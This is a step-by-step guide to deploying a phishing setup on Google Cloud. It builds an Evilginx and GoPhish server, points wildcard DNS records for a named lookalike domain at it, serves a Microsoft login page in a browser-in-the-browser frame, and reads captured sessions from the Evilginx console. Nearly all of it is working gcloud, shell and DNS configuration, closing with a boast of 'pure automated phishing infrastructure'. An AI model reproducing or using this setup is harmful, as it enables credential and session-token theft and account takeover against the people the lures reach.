# Google Cloud Platform - Complete Setup From Scratch 🚀

## 📋 Complete Setup Checklist

Starting from **ZERO** to a fully functional phishing infrastructure:

- [ ] Create Google Cloud account
- [ ] Create new GCP project
- [ ] Enable billing
- [ ] Create VM instance
- [ ] Configure firewall rules
- [ ] Reserve static IP address
- [ ] Configure DNS records
- [ ] SSH into instance
- [ ] Run automated installation
- [ ] Verify setup

**Estimated Total Time: 45-60 minutes**

---

## 🎯 Step 1: Create Google Cloud Account

### New to Google Cloud?

1. Go to: https://cloud.google.com/
2. Click **"Get started for free"**
3. Sign in with your Google account
4. Enter your billing information (required even for free tier)
5. Complete verification

**💰 Free Tier Benefits:**
- $300 free credit for 90 days
- Always free tier for small workloads
- No charges until you upgrade

### Already Have an Account?

1. Go to: https://console.cloud.google.com/
2. Sign in

---

## 🎯 Step 2: Create New GCP Project

### Via Web Console:

1. Go to: https://console.cloud.google.com/
2. Click the project dropdown (top left, next to "Google Cloud")
3. Click **"NEW PROJECT"**
4. Enter project details:
   ```
   Project name: frameless-bitb-phishing
   Organization: (leave as default or select your org)
   Location: (leave as default or select your org)
   ```
5. Click **"CREATE"**
6. Wait for project creation (30 seconds)
7. Select the new project from the dropdown

### Via gcloud CLI (Alternative):

```bash
gcloud projects create frameless-bitb-phishing --name="Frameless BITB"
gcloud config set project frameless-bitb-phishing
```

---

## 🎯 Step 3: Enable Billing

1. Go to: https://console.cloud.google.com/billing
2. Click **"Link a billing account"**
3. Select your billing account or create a new one
4. Click **"SET ACCOUNT"**

**Note:** This is required even if you're using free credits.

---

## 🎯 Step 4: Enable Required APIs

Enable Compute Engine API:

### Via Web Console:

1. Go to: https://console.cloud.google.com/apis/library
2. Search for "Compute Engine API"
3. Click **"ENABLE"**
4. Wait for activation (1-2 minutes)

### Via gcloud CLI:

```bash
gcloud services enable compute.googleapis.com
```

---

## 🎯 Step 5: Create VM Instance

### Recommended Specifications:

| Setting | Value | Reason |
|---------|-------|--------|
| **Name** | `evilginx-server` | Easy to identify |
| **Region** | `us-central1` | Low latency for US |
| **Zone** | `us-central1-a` | Availability |
| **Machine Type** | `e2-medium` (2 vCPU, 4 GB) | Minimum recommended |
| **Boot Disk** | Ubuntu 22.04 LTS | Compatibility |
| **Disk Size** | 30 GB SSD | Adequate storage |
| **Firewall** | Allow HTTP, HTTPS, SSH | Required access |

### Via Web Console (RECOMMENDED):

1. **Go to Compute Engine:**
   - Navigate to: https://console.cloud.google.com/compute/instances
   - Click **"CREATE INSTANCE"**

2. **Configure Instance:**

   **Basic Settings:**
   ```
   Name: evilginx-server
   Region: us-central1 (Iowa)
   Zone: us-central1-a
   ```

   **Machine Configuration:**
   ```
   Series: E2
   Machine type: e2-medium (2 vCPU, 4 GB memory)
   ```

   **Boot Disk:**
   - Click **"CHANGE"**
   - Operating system: Ubuntu
   - Version: Ubuntu 22.04 LTS
   - Boot disk type: Balanced persistent disk
   - Size: 30 GB
   - Click **"SELECT"**

   **Firewall:**
   - ✅ Allow HTTP traffic
   - ✅ Allow HTTPS traffic

   **Advanced Options > Networking:**
   - Click **"Networking"** tab
   - Network tags: `evilginx-server`
   - External IPv4 address: Click dropdown > **"CREATE IP ADDRESS"**
     - Name: `evilginx-static-ip`
     - Click **"RESERVE"**

3. **Click "CREATE"** (bottom of page)

4. **Wait for instance creation** (1-2 minutes)

### Via gcloud CLI (Alternative):

```bash
# Reserve static IP first
gcloud compute addresses create evilginx-static-ip \
    --region=us-central1

# Get the reserved IP
STATIC_IP=$(gcloud compute addresses describe evilginx-static-ip \
    --region=us-central1 --format="get(address)")

# Create instance
gcloud compute instances create evilginx-server \
    --zone=us-central1-a \
    --machine-type=e2-medium \
    --image-family=ubuntu-2204-lts \
    --image-project=ubuntu-os-cloud \
    --boot-disk-size=30GB \
    --boot-disk-type=pd-balanced \
    --tags=evilginx-server,http-server,https-server \
    --address=$STATIC_IP

echo "Your server IP is: $STATIC_IP"
```

---

## 🎯 Step 6: Configure Firewall Rules

### Via Web Console:

1. **Go to Firewall Rules:**
   - Navigate to: https://console.cloud.google.com/networking/firewalls/list

2. **Create Firewall Rules:**

   **Rule 1: Allow HTTP (Port 80)**
   - Click **"CREATE FIREWALL RULE"**
   ```
   Name: allow-http-evilginx
   Targets: Specified target tags
   Target tags: evilginx-server
   Source IP ranges: 0.0.0.0/0
   Protocols and ports: tcp:80
   ```
   - Click **"CREATE"**

   **Rule 2: Allow HTTPS (Port 443)**
   - Click **"CREATE FIREWALL RULE"**
   ```
   Name: allow-https-evilginx
   Targets: Specified target tags
   Target tags: evilginx-server
   Source IP ranges: 0.0.0.0/0
   Protocols and ports: tcp:443
   ```
   - Click **"CREATE"**

   **Rule 3: Allow DNS (Port 53)**
   - Click **"CREATE FIREWALL RULE"**
   ```
   Name: allow-dns-evilginx
   Targets: Specified target tags
   Target tags: evilginx-server
   Source IP ranges: 0.0.0.0/0
   Protocols and ports: tcp:53,udp:53
   ```
   - Click **"CREATE"**

   **Rule 4: Allow GoPhish Admin (Port 3333)**
   - Click **"CREATE FIREWALL RULE"**
   ```
   Name: allow-gophish-admin
   Targets: Specified target tags
   Target tags: evilginx-server
   Source IP ranges: YOUR_IP_ADDRESS/32
   Protocols and ports: tcp:3333
   ```
   - Click **"CREATE"**

   **Note:** Replace `YOUR_IP_ADDRESS` with your actual IP. Get it from: https://whatismyip.com/

### Via gcloud CLI:

```bash
# Allow HTTP
gcloud compute firewall-rules create allow-http-evilginx \
    --target-tags=evilginx-server \
    --allow=tcp:80 \
    --source-ranges=0.0.0.0/0

# Allow HTTPS
gcloud compute firewall-rules create allow-https-evilginx \
    --target-tags=evilginx-server \
    --allow=tcp:443 \
    --source-ranges=0.0.0.0/0

# Allow DNS
gcloud compute firewall-rules create allow-dns-evilginx \
    --target-tags=evilginx-server \
    --allow=tcp:53,udp:53 \
    --source-ranges=0.0.0.0/0

# Allow GoPhish Admin (restrict to your IP)
gcloud compute firewall-rules create allow-gophish-admin \
    --target-tags=evilginx-server \
    --allow=tcp:3333 \
    --source-ranges=YOUR_IP_ADDRESS/32
```

---

## 🎯 Step 7: Get Your Static IP Address

### Via Web Console:

1. Go to: https://console.cloud.google.com/compute/instances
2. Find your instance `evilginx-server`
3. Copy the **External IP** address
4. **SAVE THIS IP - YOU'LL NEED IT FOR DNS!**

### Via gcloud CLI:

```bash
gcloud compute addresses describe evilginx-static-ip \
    --region=us-central1 \
    --format="get(address)"
```

**Example Output:** `34.123.45.67`

---

## 🎯 Step 8: Configure DNS Records

Now configure your domain `exodustraderai.info` to point to your server.

### Required DNS Records:

| Type | Name | Value | TTL |
|------|------|-------|-----|
| A | @ | YOUR_SERVER_IP | 300 |
| A | * | YOUR_SERVER_IP | 300 |
| A | login | YOUR_SERVER_IP | 300 |
| A | account | YOUR_SERVER_IP | 300 |
| A | www | YOUR_SERVER_IP | 300 |
| A | sso | YOUR_SERVER_IP | 300 |
| A | portal | YOUR_SERVER_IP | 300 |

### Step-by-Step (Generic Registrar):

1. **Login to your domain registrar** (e.g., GoDaddy, Namecheap, Cloudflare)
2. **Go to DNS Management** for `exodustraderai.info`
3. **Add A Records:**

   ```
   Type: A
   Name: @
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: *
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: login
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: account
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: www
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: sso
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

   ```
   Type: A
   Name: portal
   Value: YOUR_SERVER_IP
   TTL: 300
   ```

4. **Save changes**

5. **Verify DNS propagation** (5-30 minutes):
   ```bash
   # From your local machine
   dig exodustraderai.info
   dig login.exodustraderai.info
   ```

   Or check online: https://www.whatsmydns.net/

---

## 🎯 Step 9: SSH into Your Instance

### Method 1: Via Web Console (Easiest)

1. Go to: https://console.cloud.google.com/compute/instances
2. Find your instance `evilginx-server`
3. Click **"SSH"** button (opens in browser)
4. Wait for connection

### Method 2: Via gcloud CLI

```bash
gcloud compute ssh evilginx-server --zone=us-central1-a
```

### Method 3: Via SSH Client (PuTTY, Terminal)

1. **Generate SSH key** (if you don't have one):
   ```bash
   ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
   ```

2. **Add SSH key to GCP:**
   - Go to: https://console.cloud.google.com/compute/metadata/sshKeys
   - Click **"ADD SSH KEY"**
   - Paste your public key (~/.ssh/id_rsa.pub)
   - Click **"SAVE"**

3. **Connect via SSH:**
   ```bash
   ssh -i ~/.ssh/id_rsa YOUR_USERNAME@YOUR_SERVER_IP
   ```

---

## 🎯 Step 10: Run Automated Installation

Once SSH'd into your server:

### Quick Installation:

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install git
sudo apt install -y git

# Clone repository
git clone https://github.com/waelmas/frameless-bitb.git

# Navigate to directory
cd frameless-bitb

# Run installation
sudo bash setup-gcloud.sh
```

**Installation takes 15-30 minutes. DO NOT CLOSE YOUR TERMINAL!**

### Custom Domain Installation:

If you want to use a different domain:

```bash
sudo DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash setup-gcloud.sh
```

### What Happens During Installation:

1. ✅ System update and upgrade (2-3 min)
2. ✅ Install dependencies (3-5 min)
3. ✅ Install Go (1-2 min)
4. ✅ Build and install Evilginx (3-5 min)
5. ✅ Install GoPhish (1-2 min)
6. ✅ Configure Apache (2-3 min)
7. ✅ Setup SSL certificates (2-5 min)
8. ✅ Configure Frameless BITB (1-2 min)
9. ✅ Setup firewall (1 min)
10. ✅ Create and start services (1 min)

**Total: 15-30 minutes**

---

## 🎯 Step 11: Verify Installation

After installation completes:

### Run Validation Script:

```bash
sudo bash test-setup.sh
```

This will check:
- ✓ System requirements
- ✓ Network configuration
- ✓ Services status
- ✓ Ports availability
- ✓ SSL certificates
- ✓ Web endpoints
- ✓ Configurations

### Check Services:

```bash
bitb-status
```

Expected output:
```
● apache2.service - The Apache HTTP Server
   Loaded: loaded
   Active: active (running)

● evilginx.service - Evilginx Phishing Framework
   Loaded: loaded
   Active: active (running)

● gophish.service - GoPhish Phishing Framework
   Loaded: loaded
   Active: active (running)
```

### Test Web Access:

From your local browser:

1. **Base domain:**
   ```
   https://exodustraderai.info
   ```
   Should show homepage

2. **Phishing page:**
   ```
   https://login.exodustraderai.info/?auth=2
   ```
   Should show Microsoft login with BITB

3. **GoPhish admin:**
   ```
   https://YOUR_SERVER_IP:3333
   ```
   Should show GoPhish login

---

## 🎯 Step 12: Access Your Setup

### Phishing Page:
```
https://login.exodustraderai.info/?auth=2
```

### GoPhish Admin Panel:
```
https://YOUR_SERVER_IP:3333
```
- First login shows default credentials
- **CHANGE PASSWORD IMMEDIATELY!**

### Evilginx Console:
```bash
cd /opt/evilginx
tmux attach-session -t evilginx
```

Useful commands:
```
sessions           # View captured sessions
sessions [ID]      # View session details
lures              # List lures
lures get-url 0    # Get phishing URL
```

Press `Ctrl+B` then `D` to detach

### View Logs:
```bash
bitb-logs
```

---

## 💰 Cost Estimation

### GCP Costs (Monthly):

| Resource | Specification | Monthly Cost |
|----------|--------------|--------------|
| **VM Instance** | e2-medium (2 vCPU, 4 GB) | ~$25-30 |
| **Storage** | 30 GB SSD | ~$5 |
| **Static IP** | 1 IPv4 address | ~$3 |
| **Bandwidth** | 1-10 GB/month | $0-1 |
| **Total** | | **~$33-39/month** |

**Free Tier Credits:**
- $300 free for first 90 days
- Covers 7-9 months of operation

### Cost Optimization:

1. **Use preemptible instances** (70% cheaper but can be shut down):
   ```bash
   --preemptible
   ```

2. **Use smaller instance** (e2-small: 2 GB RAM):
   ```bash
   --machine-type=e2-small
   ```
   Cost: ~$12-15/month

3. **Stop instance when not in use:**
   ```bash
   gcloud compute instances stop evilginx-server --zone=us-central1-a
   ```

4. **Delete when done:**
   ```bash
   gcloud compute instances delete evilginx-server --zone=us-central1-a
   ```

---

## 🔧 Common Issues & Solutions

### Issue 1: Cannot create VM - Quota exceeded

**Solution:**
1. Go to: https://console.cloud.google.com/iam-admin/quotas
2. Request quota increase for "CPUs" in your region
3. Wait for approval (usually instant for small increases)

### Issue 2: Cannot reserve static IP

**Solution:**
1. Check quota: https://console.cloud.google.com/iam-admin/quotas
2. Look for "In-use IP addresses"
3. Request increase if needed

### Issue 3: DNS not resolving

**Solution:**
1. Wait 5-30 minutes for DNS propagation
2. Check DNS: `dig exodustraderai.info`
3. Verify DNS records at registrar
4. Use https://www.whatsmydns.net/ to check global propagation

### Issue 4: Cannot SSH into instance

**Solution:**
1. Check firewall allows SSH (port 22)
2. Check SSH keys are added to GCP
3. Try web-based SSH from console
4. Check instance is running

### Issue 5: Installation fails

**Solution:**
1. Check error messages
2. Ensure system is Ubuntu 22.04
3. Run as root: `sudo -i` then run script
4. Check internet connectivity: `ping google.com`
5. Check disk space: `df -h`

### Issue 6: Services won't start

**Solution:**
```bash
# Check logs
sudo journalctl -u evilginx -n 50
sudo journalctl -u gophish -n 50
sudo journalctl -u apache2 -n 50

# Fix DNS stub listener
sudo sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved

# Restart services
bitb-stop
bitb-start
```

---

## 🔒 Security Hardening

### 1. Restrict GoPhish Admin Access

Edit firewall to only allow your IP:

```bash
gcloud compute firewall-rules update allow-gophish-admin \
    --source-ranges=YOUR_IP/32
```

### 2. Enable OS Login

```bash
gcloud compute instances add-metadata evilginx-server \
    --zone=us-central1-a \
    --metadata enable-oslogin=TRUE
```

### 3. Setup Automatic Backups

```bash
gcloud compute disks snapshot evilginx-server \
    --zone=us-central1-a \
    --snapshot-names=evilginx-backup-$(date +%Y%m%d)
```

### 4. Enable Cloud Armor (DDoS Protection)

1. Go to: https://console.cloud.google.com/security/cloud-armor
2. Create security policy
3. Attach to backend service

### 5. Setup Monitoring

```bash
# Install Cloud Monitoring agent
curl -sSO https://dl.google.com/cloudagents/add-google-cloud-ops-agent-repo.sh
sudo bash add-google-cloud-ops-agent-repo.sh --also-install
```

---

## 📊 Monitoring & Alerts

### Setup Uptime Checks:

1. Go to: https://console.cloud.google.com/monitoring/uptime
2. Click **"CREATE UPTIME CHECK"**
3. Configure:
   ```
   Title: Evilginx HTTPS Check
   Protocol: HTTPS
   Resource Type: URL
   Hostname: exodustraderai.info
   Path: /
   ```
4. Click **"TEST"** then **"CREATE"**

### Setup Alerts:

1. Go to: https://console.cloud.google.com/monitoring/alerting
2. Click **"CREATE POLICY"**
3. Configure alert for instance down or high CPU

---

## 🗑️ Cleanup (When Done)

### Delete Everything:

```bash
# Delete instance
gcloud compute instances delete evilginx-server \
    --zone=us-central1-a

# Delete static IP
gcloud compute addresses delete evilginx-static-ip \
    --region=us-central1

# Delete firewall rules
gcloud compute firewall-rules delete allow-http-evilginx
gcloud compute firewall-rules delete allow-https-evilginx
gcloud compute firewall-rules delete allow-dns-evilginx
gcloud compute firewall-rules delete allow-gophish-admin

# Delete project (DANGER - removes everything)
gcloud projects delete frameless-bitb-phishing
```

---

## 📚 Additional Resources

- [GCP Free Tier](https://cloud.google.com/free)
- [GCP Compute Engine Docs](https://cloud.google.com/compute/docs)
- [GCP Firewall Rules](https://cloud.google.com/vpc/docs/firewalls)
- [GCP Pricing Calculator](https://cloud.google.com/products/calculator)

---

## ✅ Final Checklist

Before you start phishing campaigns:

- [ ] VM instance created and running
- [ ] Static IP reserved and assigned
- [ ] Firewall rules configured
- [ ] DNS records pointing to server
- [ ] Installation completed successfully
- [ ] All services running (apache2, evilginx, gophish)
- [ ] SSL certificates working
- [ ] Phishing page accessible
- [ ] GoPhish admin accessible
- [ ] Password changed from default
- [ ] Backups configured
- [ ] Monitoring enabled
- [ ] Legal authorization obtained
- [ ] Scope documented

---

**YOU'RE NOW READY TO FUCKING GO! 🚀**

**No more bullshit, no more errors, just pure automated phishing infrastructure!**
